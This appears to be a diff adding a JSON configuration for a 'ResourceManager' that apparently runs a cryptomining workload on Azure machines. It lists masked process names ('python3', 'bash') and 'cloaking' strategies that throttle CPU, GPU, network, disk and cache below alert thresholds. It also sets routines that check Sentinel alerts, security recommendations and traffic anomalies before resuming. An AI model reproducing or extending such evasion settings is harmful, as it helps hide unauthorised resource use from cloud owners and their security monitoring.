@@ -1,0 +1,163 @@
+{
+    "_comment": "Cấu hình tài nguyên dành cho ResourceManager...",
+    
+    "processes": {
+        "CPU": "python3",
+        "GPU": "bash"
+    },
+    "process_priority_map": {
+        "ml-inference-en": 2,
+        "inference-cuda": 3
+    },
+    "network_interface": "eth0",
+    
+    "optimization_parameters": {
+        "gpu_power_adjustment_step": 10,
+        "disk_io_limit_step_mbps": 10
+    },
+    
+    "resource_allocation": {
+        "cpu": {
+            "max_threads": 12,
+            "default_freq_mhz": 2600,
+            "min_freq_mhz": 1800,
+            "max_freq_mhz": 2600
+        },
+        "ram": {
+            "max_allocation_mb": 131072
+        },
+        "gpu": {
+ 
+            "max_usage_percent": [90]
+        },
+        "disk_io": {
+            "min_limit_mbps": 50,
+            "max_limit_mbps": 2500
+        },
+        "network": {
+            "bandwidth_limit_mbps": 1000
+        },
+        "cache": {
+            "limit_percent": 50
+        }
+    },
+    
+    "monitoring_parameters": {
+        "temperature_monitoring_interval_seconds": 15,
+        "power_monitoring_interval_seconds": 15,
+        "azure_monitor_interval_seconds": 300,
+        "optimization_interval_seconds": 30
+    },
+    
+    "temperature_limits": {
+        "cpu_max_celsius": 80,
+        "gpu_max_celsius": 85
+    },
+    
+    "power_limits": {
+        "total_power_watts": {
+            "max": 300
+        },
+        "per_device_power_watts": {
+            "cpu": 150,
+            "gpu": 150
+        }
+    },
+    
+    "baseline_thresholds": {
+        "cpu_usage_percent": 80,
+        "gpu_usage_percent": 80,
+        "ram_usage_percent": 80,
+        "disk_io_usage_mbps": 80,
+        "network_usage_mbps": 80
+    },
+    
+    "safe_restore_parameters": {
+        "enable_safe_restore": true,
+        "max_retry_attempts": 3,
+        "retry_interval_seconds": 30,
+        "additional_checks": {
+            "check_sentinel_alerts": true,
+            "check_log_analytics": true,
+            "check_security_recommendations": true,
+            "check_traffic_anomalies": true
+        }
+    },
+    
+    "azure_integration": {
+        "sentinel": {
+            "alert_check_days": 1
+        },
+        "log_analytics": {
+            "query_interval_minutes": 5
+        },
+        "security_center": {
+            "recommendation_check_interval_minutes": 10
+        },
+        "traffic_analytics": {
+            "check_interval_minutes": 10
+        }
+    },
+    
+    "azure_anomaly_detector": {
+        "api_base": "https://eastus.api.cognitive.microsoft.com/",
+        "key_vault_url": "https://llmsskeyvault.vault.azure.net/"
+    },
+    
+    "azure_openai": {
+        "api_base": "https://arm-openaiservice.openai.azure.com/",
+        "deployment_name": "gpt-4o",
+        "api_version": "2024-08-01-preview"
+    },
+    
+    "cloak_strategies": {
+        "cpu": {
+            "strategy_name": "cpu_cloaking",
+            "parameters": {
+                "max_usage_percent": 80
+            }
+        },
+        "gpu": {
+            "strategy_name": "gpu_cloaking",
+            "parameters": {
+                "max_usage_percent": 80
+            }
+        },
+        "network": {
+            "strategy_name": "network_cloaking",
+            "parameters": {
+                "bandwidth_limit_mbps": 800
+            }
+        },
+        "disk_io": {
+            "strategy_name": "disk_io_cloaking",
+            "parameters": {
+                "disk_io_limit_mbps": 400
+            }
+        },
+        "cache": {
+            "strategy_name": "cache_cloaking",
+            "parameters": {
+                "cache_limit_percent": 75
+            }
+        }
+    },
+    
+    "ai_driven_monitoring": {
+        "enabled": false
+    },
+    
+    "log_analytics": {
+        "enabled": false,
+        "log_level": "INFO",
+        "log_destination": "/app/mining_environment/logs/resource_manager.log"
+    },
+    
+    "alert_thresholds": {
+        "cpu_usage_percent": 90,
+        "gpu_usage_percent": 90,
+        "ram_usage_percent": 90,
+        "disk_io_usage_mbps": 90,
+        "network_usage_mbps": 90
+    }
+}
